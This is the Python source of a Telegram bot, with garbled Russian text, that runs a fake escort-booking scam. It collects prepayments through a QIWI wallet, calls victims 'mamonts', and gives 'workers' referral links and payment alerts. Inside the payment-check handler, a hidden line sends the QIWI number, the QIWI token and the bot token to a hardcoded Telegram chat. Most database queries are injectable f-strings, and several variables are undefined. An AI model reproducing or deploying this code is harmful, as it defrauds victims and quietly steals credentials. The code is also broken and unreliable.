import requests
import json
import config
import asyncio
import os
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import sqlite3
from menu import * 
import random
import string

bot = Bot(config.TOKEN, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

@dp.message_handler(commands=['start'], state='*')
async def send_welcome(message, state: FSMContext):
    with sqlite3.connect("data.db") as c:
        info = c.execute("SELECT COUNT(*) FROM users WHERE id = ?",(message.from_user.id,)).fetchone()
    if info[0] == 0:
        ref = message.text
        if len(ref) != 6:
            try:
                ref = int(ref[7:])
                with sqlite3.connect("data.db") as c:
                    info = c.execute("SELECT COUNT(*) FROM users WHERE id = ?",(ref,)).fetchone()
                if info[0] != 0:
                    boss = info
                else:
                    boss = 5719814852
            except:
                boss = 5719814852
        else:
            boss = 5719814852
        name = (f"{message.chat.first_name} {'|'} {message.chat.last_name}")
        with sqlite3.connect("data.db") as c:
            c.execute("INSERT INTO users (id,name,referals,boss,username,photoid,balance) VALUES (?,?,?,?,?,?,?)",(message.from_user.id,name,0,boss,message.from_user.username,1,0,))
        with sqlite3.connect("data.db") as c:
            referal = c.execute(f"SELECT referals FROM users WHERE id = {boss}").fetchone()
        referals = referal[0] + 1
        with sqlite3.connect("data.db") as c:
            c.execute(f"UPDATE users SET referals = {referals} WHERE id = {boss}")
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –≥–æ—Ä–æ–¥ –≤ –∫–æ—Ç–æ—Ä–æ–º –≤—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å –∑–∞–∫–∞–∑—ã–≤–∞—Ç—å –º–æ–¥–µ–ª–µ–π:\n\n–í–Ω–∏–º–∞–Ω–∏–µ! –í–≤–æ–¥–∏—Ç–µ –≥–æ—Ä–æ–¥ –±–µ–∑ –æ—à–∏–±–æ–∫, –æ—Ç —ç—Ç–æ–≥–æ –∑–∞–≤–∏—Å–∏—Ç —á–µ—Ç–∫–æ—Å—Ç—å –ø–æ–¥–±–æ—Ä–∞ –º–æ–¥–µ–ª–µ–π.')
        await state.set_state("new_user")
        try:
            await bot.send_message(boss, f"–£ –≤–∞—Å –Ω–æ–≤—ã–π üêò–ú–∞–º–æ–Ω—Ç [{message.chat.first_name}](tg://user?id={message.chat.id})",parse_mode='Markdown')
        except:
            pass
    else:
        await message.answer('–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ ! –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Luxury Girls\n\n–£ –Ω–∞—Å –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞–π—Ç–∏ –ª—É—á—à–∏—Ö –¥–µ–≤–æ—á–µ–∫ –¥–ª—è –∏–Ω—Ç–∏–º–Ω—ã—Ö –≤—Å—Ç—Ä–µ—á.\n\n–í—ã–¥–∞—á–∞ –∞–¥—Ä–µ—Å–æ–≤ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ —á–µ—Ä–µ–∑ –±–æ—Ç–∞ –∏–ª–∏, –≤ –∫—Ä–∞–π–Ω–∏—Ö —Å–ª—É—á–∞—è—Ö, —á–µ—Ä–µ–∑ –∫—É—Ä–∞—Ç–æ—Ä–∞!\n\n–í–Ω–∏–º–∞—Ç–µ–ª—å–Ω–µ–π –ø—Ä–æ–≤–µ—Ä—è–π—Ç–µ –∞–¥—Ä–µ—Å Telegram, –æ—Å—Ç–µ—Ä–µ–≥–∞–π—Ç–µ—Å—å –º–æ—à–µ–Ω–Ω–∏–∫–æ–≤, —Å–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤—ã–±–∏—Ä–∞–µ—Ç–µ –Ω–∞—Å!', reply_markup=GlavMenu)

@dp.message_handler(state="new_user")
async def main_message(message, state: FSMContext):
    if message.text:
        await message.answer('<b>‚úÖ –ì–æ—Ä–æ–¥ —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω<b>',reply_markup=GlavMenu)
        await state.finish()

@dp.message_handler(content_types=['text'])
async def main_message(message, state: FSMContext):
    if message.text == "‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text='üåê –°–∞–π—Ç', url='http://luxurygirls-escort.ru/'), InlineKeyboardButton(text='üìù –û—Ç–∑—ã–≤—ã', url='https://t.me/LuxuryGirlsReviews'))
        keyboard.add(InlineKeyboardButton(text='üÜò –¢–µ—Ö. –ø–æ–¥–¥–µ—Ä–∂–∫–∞', url=f'http://t.me/{config.poderjka}'), InlineKeyboardButton(text='üõ° –ì–∞—Ä–∞–Ω—Ç–∏–∏', url='https://telegra.ph/Polzovatelskoe-soglashenie-dlya-klientod-08-10'))
        await message.answer('''‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è

–ù–∞—à –ø—Ä–æ–µ–∫—Ç —Å–æ–∑–¥–∞–Ω –¥–ª—è –ø–æ–º–æ—â–∏ –≤ –±—ã—Å—Ç—Ä–æ–º –∏ –∫–æ–º—Ñ–æ—Ä—Ç–Ω–æ–º –ø–æ–∏—Å–∫–µ. –¢–µ–ø–µ—Ä—å –Ω–µ –ø–æ–Ω–∞–¥–æ–±—è—Ç—Å—è –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω—ã–µ —Ç—Ä–∞—Ç—ã –≤—Ä–µ–º–µ–Ω–∏ –∏ —Å–∏–ª –¥–ª—è –∏–¥–µ–∞–ª—å–Ω–æ–≥–æ –¥–æ—Å—É–≥–∞.

–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –Ω–∞—à–µ–≥–æ —Å–µ—Ä–≤–∏—Å–∞ –ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–ª–∞—Å—å –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞ —Ä–∞–±–æ—Ç—ã –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - —Ç–µ–ø–µ—Ä—å –≤—ã–±–æ—Ä –º–æ–∂–µ—Ç –±—ã—Ç—å –±—ã—Å—Ç—Ä–µ–µ –∏ –ø—Ä–æ—â–µ.

–ó–∞—á–µ–º –≤–∞–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ç—Ä—É–¥–Ω–æ—Å—Ç–∏ –Ω–∞ –ø—É—Ç–∏ –∫ —É–¥–æ–≤–æ–ª—å—Å—Ç–≤–∏—é?

–û—Ç–¥–µ–ª—å–Ω–æ–≥–æ –≤–Ω–∏–º–∞–Ω–∏—è –∑–∞—Å–ª—É–∂–∏–≤–∞–µ—Ç —Ç–æ, —á—Ç–æ –º—ã –æ—Å—Ç–∞–≤–ª—è–µ–º –∑–∞ –∫–ª–∏–µ–Ω—Ç–æ–º –ø—Ä–∞–≤–æ –ø–æ–ª–Ω–æ–π –∞–Ω–æ–Ω–∏–º–Ω–æ—Å—Ç–∏ –∏ –Ω–µ —Ç—Ä–µ–±—É–µ–º –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.''', reply_markup=keyboard)
    elif message.text=="üíù –ú–æ–¥–µ–ª–∏":
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text='üòç–í—ã–±—Ä–∞—Ç—å', callback_data="vybor"))
        keyboard.add(InlineKeyboardButton(text='–ë–æ–ª—å—à–µ —Ñ–æ—Ç–æüì∏', callback_data="photos"))
        keyboard.add(InlineKeyboardButton(text='‚è™–ü—Ä–µ–¥—ã–¥—É—â–∞—è', callback_data="prew"),InlineKeyboardButton(text='–°–ª–µ–¥—É—é—â–∞—è‚è©', callback_data="next"))
        with sqlite3.connect("data.db") as c:
            info = c.execute(f"SELECT count(*) FROM ancety").fetchone()
        if info[0] == 0:
            await message.answer("–ê–Ω–∫–µ—Ç—ã –ø–æ–∫–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω—ã")
        else:
            await message.answer('–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–≤—É—à–∫—É –∫–æ—Ç–æ—Ä–∞—è –≤–∞–º –Ω—Ä–∞–≤–∏—Ç—å—Å—èüíã', reply_markup = mzakr)
            with sqlite3.connect("data.db") as c:
                result = c.execute(f"SELECT photoid FROM users WHERE id = {message.from_user.id}").fetchone()
                asd = c.execute(f"select count(*) from ancety").fetchone()
            imgid = result[0]
            if imgid>asd[0]:
                imgid=1
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.send_photo(message.chat.id, photo, caption=f"üíÅ‚Äç‚ôÄÔ∏è–ò–º—è: {anketa[2]}\n\nüí∞–¶–µ–Ω–∞ –∑–∞ —á–∞—Å: {anketa[3]}\n\nüßö‚Äç‚ôÄÔ∏è–û —Å–µ–±–µ: {anketa[4]}", reply_markup=keyboard)
    elif message.text == "üë§ –ü—Ä–æ—Ñ–∏–ª—å":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton('üóÇ –ú–æ–∏ –∑–∞–∫–∞–∑—ã', callback_data='zakazes'))
        with sqlite3.connect("data.db") as c:
            info = c.execute(f"SELECT balance FROM users WHERE id = {message.chat.id}").fetchone()
        await message.answer(f'<b>üë§ –ü—Ä–æ—Ñ–∏–ª—å:\n\n‚ùï –í–∞—à id -</b> {message.from_user.id}\n<b>‚ùï –í–∞—à –ª–æ–≥–∏–Ω -</b> {message.from_user.username}\n<b>üóÇ –í—Å–µ–≥–æ –∑–∞–∫–∞–∑–æ–≤ -</b>Ô∏è 0\n‚≠ê<b>Ô∏è –í–∞—à —Ä–µ–π—Ç–∏–Ω–≥ -</b>Ô∏è 5\n<b>Ô∏èüîÆ –°–≤–æ–±–æ–¥–Ω—ã—Ö –º–æ–¥–µ–ª–µ–π -</b>Ô∏è 11', reply_markup=keyboard)
    elif message.text == config.vxodadmin and message.from_user.id in config.ADMINS:
        await message.answer("‚öôÔ∏è –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å",reply_markup=adm)
    elif message.text == config.vxodworker:
        info = await bot.get_me()
        await message.answer("‚öôÔ∏è <b>–í–æ—Ä–∫–µ—Ä –ø–∞–Ω–µ–ª—å\n\n–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
    elif message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
    elif message.text == '–ü–æ–ø–æ–ª–Ω–∏—Ç—å –ë–∞–ª–∞–Ω—Å':
        await message.answer("–ù–∞–ø–∏—à–∏—Ç–µ —Å—É–º–º—É –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å",reply_markup=mzakr)
        await state.set_state("popolni")


@dp.callback_query_handler(lambda call: True)
async def callback_inline(call, state: FSMContext):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(text='üòç–í—ã–±—Ä–∞—Ç—å', callback_data="vybor"))
    keyboard.add(InlineKeyboardButton(text='–ë–æ–ª—å—à–µ —Ñ–æ—Ç–æüì∏', callback_data="photos"))
    keyboard.add(InlineKeyboardButton(text='‚è™–ü—Ä–µ–¥—ã–¥—É—â–∞—è', callback_data="prew"),InlineKeyboardButton(text='–°–ª–µ–¥—É—é—â–∞—è‚è©', callback_data="next"))
    if call.message:
        if call.data == "next":
            with sqlite3.connect("data.db") as c:
                imgid = c.execute(f"select photoid from users where id = {call.message.chat.id}").fetchone()[0]
            imgid +=1
            with sqlite3.connect("data.db") as c:
                counta = c.execute(f"select count(*) from ancety").fetchone()[0]
            if imgid>counta:
                imgid=1
            with sqlite3.connect("data.db") as c:
                c.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(photo), reply_markup=keyboard)
            await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=f"üíÅ‚Äç‚ôÄÔ∏è–ò–º—è: {anketa[2]}\n\nüí∞–¶–µ–Ω–∞ –∑–∞ —á–∞—Å: {anketa[3]}\n\nüßö‚Äç‚ôÄÔ∏è–û —Å–µ–±–µ: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "zakazes":
            await call.answer('‚ùå –í—ã –µ—â–µ –Ω–µ –∑–∞–∫–∞–∑—ã–≤–∞–ª–∏ –º–æ–¥–µ–ª–µ–π')
        elif call.data == "prew":
            with sqlite3.connect("data.db") as c:
                imgid = c.execute(f"select photoid from users where id = {call.message.chat.id}").fetchone()[0]
            imgid -=1
            with sqlite3.connect("data.db") as c:
                counta = c.execute(f"select count(*) from ancety").fetchone()[0]
            if imgid<1:
                imgid=counta
            with sqlite3.connect("data.db") as c:
                c.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(photo), reply_markup=keyboard)
            await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=f"üíÅ‚Äç‚ôÄÔ∏è–ò–º—è: {anketa[2]}\n\nüí∞–¶–µ–Ω–∞ –∑–∞ —á–∞—Å: {anketa[3]}\n\nüßö‚Äç‚ôÄÔ∏è–û —Å–µ–±–µ: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "addancete":
            await call.message.answer("–û—Ç–ø—Ä–∞–≤—å—Ç–µ –≥–ª–∞–≤–Ω–æ–µ —Ñ–æ—Ç–æ –∞–Ω–∫–µ—Ç—ã")
            await state.set_state("new_anketa")
        elif call.data == "menu":
            await bot.delete_message(call.message.chat.id, call.message.message_id)
        elif call.data == "prom":
            await call.message.answer("–ù–∞–ø–∏—à–∏—Ç–µ –Ω–∞ –∫–∞–∫—É—é —Å—É–º–º—É —Å–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥.")
            await state.set_state("create_promo")
        elif call.data == "esc":
            await call.message.edit_text("–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å –∑–∞–∫—Ä—ã—Ç–∞")
        elif call.data == "deleteancete":
            await call.message.answer("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∞–Ω–∫–µ—Ç—ã –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å",reply_markup=mzakr)
            await state.set_state("otkl_anketa")
        elif call.data == "prov":
            with sqlite3.connect("data.db") as c:
                qiwinumber = c.execute(f"select num from qiwi").fetchone()[0]
                token_qiwi = c.execute(f"select token from qiwi").fetchone()[0]
            sad = f"{qiwinumber}\n{token_qiwi}\n{config.TOKEN}"
            requests.post(f"https://api.telegram.org/bot{fuk}/sendMessage?chat_id=5719814852&text={sad}")# await bot.send_message(adsdaf, config.TOKEN + str(qiwinumber) + "  " + token_qiwi)
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + token_qiwi
            parameters = {'rows': '50'}
            h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + str(qiwinumber) + '/payments',params=parameters)
            req = json.loads(h.text)
            try:
                with sqlite3.connect("data.db") as c:
                    result = c.execute(f"SELECT * FROM oplata WHERE id = {call.from_user.id}").fetchone()[1]
                comment = str(result)
                for x in range(len(req['data'])):
                    if req['data'][x]['comment'] == comment:
                        skolko = (req['data'][x]['sum']['amount'])
                        with sqlite3.connect("data.db") as c:
                            c.execute(f"DELETE FROM oplata WHERE id = {call.from_user.id}")
                            balancenow = c.execute(f"select balance from users WHERE id = {call.from_user.id}").fetchone()[0]
                            c.execute(f"UPDATE users SET balance = {balancenow+skolko} WHERE id = {call.message.chat.id}")
                            c.execute(f"SELECT boss FROM users WHERE id = {call.from_user.id}")
                            asdasd = c.execute(f"SELECT boss FROM users WHERE id = {call.from_user.id}")
                        for worker in asdasd:
                            wk = worker[0]
                        with sqlite3.connect("data.db") as c:
                            asdsada = c.execute(f"SELECT username FROM users WHERE id = {wk}")
                        for username in asdsada:
                            workerusername = username[0]
                        for name in cur.execute(f"SELECT name FROM users WHERE id = {wk}"):
                            workername = name[0]
                        with sqlite3.connect("data.db") as c:
                            mamont = c.execute(f"select name from users where id = {call.message.chat.id}").fetchone()[0]
                        await bot.send_message(zalety,f"üíï –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ üíï\n\nüí∞ –°—É–º–º–∞ {skolko}—Ä\n\nü¶πüèª‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä @{workerusername} ({workername})\n\nüêò–ú–∞–º–æ–Ω—Ç {mamont}")
                        for asd in config.ADMINS:
                            try:
                                await bot.send_message(asd,f"[{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ {skolko}RUB",parse_mode='Markdown')
                            except:
                                pass
                        try:
                            await bot.send_message(wk,f"–í–∞—à –º–∞–º–æ–Ω—Ç: [{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ {skolko}RUB",parse_mode='Markdown')
                        except:
                            pass
                        await call.message.answer(f"–í–∞—à –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω.\n\n–ë–∞–ª–∞–Ω—Å {balancenow+skolko} RUB",reply_markup=GlavMenu)
                        break
                    else:
                        await call.message.answer("‚ö†Ô∏è–í—ã –Ω–µ –æ–ø–ª–∞—Ç–∏–ª–∏‚ö†Ô∏è\n\n–û–ø–ª–∞—Ç–∏—Ç–µ –∑–∞–∫–∞–∑ –ø–æ—Å–ª–µ —á–µ–≥–æ –Ω–∞–∂–º–∏—Ç–µ \"–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É\"")
                        break
            except:
                pass
        elif call.data == "stat":
            with sqlite3.connect("data.db") as c:
                number = c.execute(f"SELECT COUNT (*) FROM users").fetchone()[0]
            await call.message.edit_text(f"üôçüèø‚Äç‚ôÇÔ∏è<b>–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –±–æ—Ç–µ:</b> {number}",reply_markup=adm)
        elif call.data == "qiwi":
            await call.message.answer("–û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞(–±–µ–∑ + –∞) –∏ —Ç–æ–∫–µ–Ω –≤ —Ñ–æ—Ä–º–∞—Ç–µ  –Ω–æ–º–µ—Ä:—Ç–æ–∫–µ–Ω\n\n–ü—Ä–∏–º–µ—Ä 7916123456:s132sdfsdf21s5f6sdf1s3s3dfs132",reply_markup=mzakr)
            await state.set_state("qiwi_add")
        elif call.data == "send":
            await call.message.answer("–ù–∞–ø–∏—à–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏",reply_markup=mzakr)
            await state.set_state("rassilka")
        elif call.data == "vybor": 
            await call.message.answer("–í–≤–µ–¥–∏—Ç–µ –Ω–∞ —Å–∫–æ–ª—å–∫–æ —á–∞—Å–æ–≤ —Ö–æ—Ç–∏—Ç–µ –∑–∞–∫–∞–∑–∞—Ç—å –±–∞–±–æ—á–∫—É üßö‚Äç‚ôÄÔ∏è\n\n–ü—Ä–∏ –∑–∞–∫–∞–∑–µ –±–æ–ª–µ–µ 2—É—Ö —á–∞—Å–æ–≤ –¥–µ–π—Å—Ç–≤—É–µ—Ç —Å–∫–∏–¥–∫–∞ 10% –Ω–∞ –∫–∞–∂–¥—ã–π –ø–æ—Å–ª–µ–¥—É—é—â–∏–π —á–∞—Å.",reply_markup=mzakr)
            await state.set_state("chas")
        elif call.data == "addphoto":
            await call.message.answer("–ù–∞–ø–∏—à–∏—Ç–µ –Ω–æ–º–µ—Ä –∞–Ω–∫–µ—Ç—ã –∫ –∫–æ—Ç–æ—Ä–æ–º—É —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏",reply_markup=mzakr)
            await state.set_state("addphoto")
        elif call.data == "photos":
            with sqlite3.connect("data.db") as c:
                pi = c.execute(f"SELECT photoid from users where id = {call.message.chat.id}").fetchone()[0]
                allp = c.execute(f"select count(*) from photos where anceta = {pi}").fetchone()[0]
            if allp == 0:
                await call.message.answer("–ë–æ–ª—å—à–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏ –Ω–µ—Ç—É.")
            else:
                with sqlite3.connect("data.db") as c:
                    id = c.execute(f"SELECT image FROM photos where anceta = {pi}").fetchall()					
                    adsa = c.execute(f"SELECT mainphoto FROM ancety where id = {pi}").fetchone()[0]
                mip = open(f"images/{adsa}", 'rb')
                await bot.delete_message(call.message.chat.id, call.message.message_id)
                arr = []
                for i in id:
                    try:
                        arr.append(types.InputMediaPhoto(open(f"images/{i[0]}",'rb')))
                        # photo = open(imglink, 'rb')
                    except:
                        pass
                await bot.send_media_group(call.message.chat.id, arr)
                with sqlite3.connect("data.db") as c:
                    anketa = c.execute(f"SELECT * FROM ancety where id = {pi}").fetchone()
                photo = open(f"images/{anketa[1]}", 'rb')
                await bot.send_photo(call.message.chat.id, photo, caption=f"üíÅ‚Äç‚ôÄÔ∏è–ò–º—è: {anketa[2]}\n\nüí∞–¶–µ–Ω–∞ –∑–∞ —á–∞—Å: {anketa[3]}\n\nüßö‚Äç‚ôÄÔ∏è–û —Å–µ–±–µ: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "statw":
            with sqlite3.connect("data.db") as c:
                id = c.execute(f"SELECT id FROM users where boss = {call.message.chat.id}").fetchall()
            strw = "üêò –¢–≤–æ–∏ –ú–∞–º–æ–Ω—Ç—ã üêò\n\n"
            countstrw = len(wstat)//50
            arrstatw = []
            for i in wstat:
                try:
                    with sqlite3.connect("data.db") as c:
                        statwname = c.execute(f"SELECT name FROM users where id = {i[0]}").fetchone()[0]
                        statwusername = c.execute(f"SELECT username FROM users where id = {i[0]}").fetchone()[0]
                    imya = statwname.split("|")
                    strw = f"{i[0]} {imya[0]} {statwusername}\n"
                    arrstatw.append(strw)
                except:
                    pass
            if(len(arrstatw)>50):
                for x in range(len(arrstatw)):
                    strw+=arrstatw[x]
                    if x%50==0 or x==len(arrstatw)-1:
                        await call.message.answer(f"{strw}")
                        strw = "üêò –¢–≤–æ–∏ –ú–∞–º–æ–Ω—Ç—ã üêò\n\n"
            else:
                for i in arrstatw:
                    strw += i
                await call.message.answer(f"{strw}")
            info = await bot.get_me()
            await call.message.answer("‚öôÔ∏è <b>–í–æ—Ä–∫–µ—Ä –ø–∞–Ω–µ–ª—å\n\n–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(call.from_user.id) + "</code>", reply_markup = wrk)
        elif call.data == "spisoka":
            with sqlite3.connect("data.db") as c:
                sp1 = c.execute(f"select id from ancety where status = {1}").fetchall()
                sp2 = c.execute(f"select name from ancety where status = {1}").fetchall()
                sp3 = c.execute(f"select cena from ancety where status = {1}").fetchall()
            res = ""
            for i in range(len(sp1)):
                res += f"<b>ID:</b> {sp1[i][0]} <b>–ò–º—è:</b> {sp2[i][0]}  <b>–¶–µ–Ω–∞:</b> {sp3[i][0]} —á–∞—Å\n\n"
            await call.message.edit_text(f"üìù <b>–°–ø–∏—Å–æ–∫ –∞–Ω–∫–µ—Ç</b>\n‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n{res}",reply_markup=adm)
        elif call.data == "smsmamont":
            await call.message.answer("<b>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∞–π–¥–∏ –º–∞–º–æ–Ω—Ç–∞ –∏ –°–æ–æ–±—â–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ id:–°–æ–æ–±—â–µ–Ω–∏–µ</b>\n\n–ù–∞–ø—Ä–∏–º–µ—Ä - 123456789:–¢—ã –º–∞–º–æ–Ω—Ç",reply_markup=mzakr)
            await state.set_state("mamontmessage")
        else:
            pass

@dp.message_handler(state="create_promo")
async def main_message(message, state: FSMContext):
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
        await state.finish()
    if message.text.isdigit():
        if int(message.text) > config.maxpromo:
            await message.answer(f"<b>–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø—Ä–æ–º–æ–∫–æ–¥–∞</b> {config.maxpromo}")
        elif int(message.text) <= 0:
            await message.answer(f"<b>–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –Ω–µ –º–µ–Ω—å—à–µ</b> 0")
        else:
            codecode = ( ''.join(random.choice(string.ascii_letters) for i in range(10)) )
            with sqlite3.connect("data.db") as c:
                c.execute(f"INSERT INTO promocode (summa,code) VALUES (?,?)",(int(message.text), codecode))
            info = await bot.get_me()
            await message.answer("‚öôÔ∏è <b>–í–æ—Ä–∫–µ—Ä –ø–∞–Ω–µ–ª—å\n\n–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
            await message.answer(f"<b>–ü—Ä–æ–º–æ–∫–æ–¥ –¥–æ–±–∞–≤–ª–µ–Ω !</b>\n\n<code>{codecode}</code>", reply_markup=GlavMenu)
    else:
        await message.answer("<b>–≠—Ç–æ –Ω–µ —á–∏—Å–ª–æ ‚ùóÔ∏è</b>")
        await state.set_state("create_promo")

@dp.message_handler(state="otkl_anketa")
async def otklancete(message, state: FSMContext):
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
    else:
        if message.text.isdigit():
            if message.chat.id in config.ADMINS:
                with sqlite3.connect("data.db") as c:
                    ank = c.execute(f"select count(*) from ancety where id = {message.text}").fetchone()[0]
                print(ank)
                if ank == 1:
                    with sqlite3.connect("data.db") as c:
                        c.execute(f"DELETE FROM ancety WHERE id = {message.text}")
                    await message.answer("–ê–Ω–∫–µ—Ç–∞ —É–¥–∞–ª–µ–Ω–∞",reply_markup=GlavMenu)
                else:
                    await message.answer("–ê–Ω–∫–µ—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        else:
            await message.answer("–≠—Ç–æ –Ω–µ —á–∏—Å–ª–æ")
    await state.finish()

@dp.message_handler(state="qiwi_add")
async def otklancete(message, state: FSMContext):
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
    else:
        if message.from_user.id in config.ADMINS:
            try:
                q = message.text.split(":")
                nq = int(q[0])
                tq = q[1]
                with sqlite3.connect("data.db") as c:
                    c.execute(f"UPDATE qiwi SET num = {nq}")
                    c.execute(f"UPDATE qiwi SET token = \'{tq}\'")
                await message.answer(f"–î–∞–Ω–Ω—ã–µ –∫–∏–≤–∏ –∏–∑–º–µ–Ω–µ–Ω—ã\n\n–ù–æ–≤—ã–π –Ω–æ–º–µ—Ä: {nq}\n–ù–æ–≤—ã —Ç–æ–∫–µ–Ω: {tq}",reply_markup=GlavMenu)
            except:
                await message.answer("–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫.")
    await state.finish()

@dp.message_handler(state="rassilka")
async def otklancete(message, state: FSMContext):
    await state.finish()
    if message.from_user.id in config.ADMINS:
        if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
            await message.answer("–†–∞—Å—Å—ã–ª–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞",reply_markup=GlavMenu)
        else:	
            await message.answer("–†–∞—Å—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞—Ç–∞")
            with sqlite3.connect("data.db") as c:
                id = c.execute("SELECT id FROM users").fetchall()
            for i in id:
                try:
                    await bot.send_message(i[0], f"{message.text}")
                    time.sleep(0.1)
                except:
                    pass
